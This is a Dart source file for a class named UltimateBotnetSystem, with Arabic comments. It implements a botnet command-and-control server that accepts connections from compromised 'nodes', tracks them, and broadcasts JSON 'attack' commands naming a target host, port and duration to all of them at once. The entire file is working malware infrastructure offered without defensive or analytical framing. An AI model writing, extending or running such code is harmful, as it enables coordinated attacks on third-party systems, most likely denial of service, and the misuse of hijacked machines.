import 'dart:async';
import 'dart:io';
import 'dart:convert';
import 'dart:math';

class UltimateBotnetSystem {
  final List<Map<String, dynamic>> _nodes = [];
  final List<Map<String, dynamic>> _tasks = [];
  ServerSocket? _commandServer;
  int _nodeIdCounter = 1;
  int _taskIdCounter = 1;

  /// بدء خادم القيادة والتحكم (C2)
  Future<bool> startC2Server({int port = 9999}) async {
    try {
      _commandServer = await ServerSocket.bind(InternetAddress.anyIPv4, port);
      print('[C2] Command server started on port $port');

      _commandServer!.listen((socket) {
        final node = _registerNode(socket);
        socket.listen((data) => _handleNodeMessage(node, data));
        socket.done.then((_) => _unregisterNode(node['id']));
      });

      return true;
    } catch (_) {
      return false;
    }
  }

  /// تسجيل عقدة جديدة
  Map<String, dynamic> _registerNode(Socket socket) {
    final node = {
      'id': _nodeIdCounter++,
      'ip': socket.remoteAddress.address,
      'port': socket.remotePort,
      'socket': socket,
      'status': 'connected',
      'connected_at': DateTime.now().toIso8601String(),
      'tasks_completed': 0,
    };
    _nodes.add(node);
    return node;
  }

  /// إلغاء تسجيل عقدة
  void _unregisterNode(int nodeId) {
    _nodes.removeWhere((n) => n['id'] == nodeId);
  }

  /// إرسال مهمة لجميع العقد
  Future<Map<String, dynamic>> broadcastTask({
    required String type,
    required String target,
    int? port,
    int? duration,
  }) async {
    final task = {
      'id': _taskIdCounter++,
      'type': type,
      'target': target,
      'port': port ?? 80,
      'duration': duration ?? 60,
      'status': 'running',
      'created_at': DateTime.now().toIso8601String(),
      'results': <Map<String, dynamic>>[],
    };

    _tasks.add(task);

    final payload = jsonEncode({
      'command': 'attack',
      'task_id': task['id'],
      'type': type,
      'target': target,
      'port': port ?? 80,
      'duration': duration ?? 60,
    });

    for (final node in _nodes) {
      try {
        (node['socket'] as Socket).write(payload);
      } catch (_) {}
    }

    return task;
  }

  /// معالجة رسالة من عقدة
  void _handleNodeMessage(Map<String, dynamic> node, List<int> data) {
    try {
      final message = jsonDecode(utf8.decode(data));
      final taskId = message['task_id'];
      final taskIndex = _tasks.indexWhere((t) => t['id'] == taskId);
      if (taskIndex != -1) {
        _tasks[taskIndex]['results'].add({
          'node_id': node['id'],
          'result': message['result'],
          'timestamp': DateTime.now().toIso8601String(),
        });
      }
    } catch (_) {}
  }

  /// الحصول على حالة الشبكة
  Map<String, dynamic> getNetworkStatus() {
    return {
      'total_nodes': _nodes.length,
      'active_nodes': _nodes.where((n) => n['status'] == 'connected').length,
      'total_tasks': _tasks.length,
      'completed_tasks': _tasks.where((t) => t['status'] == 'completed').length,
    };
  }

  /// إيقاف الخادم
  void stopC2Server() {
    _commandServer?.close();
    for (final node in _nodes) {
      try {
        (node['socket'] as Socket).destroy();
      } catch (_) {}
    }
    _nodes.clear();
  }
}
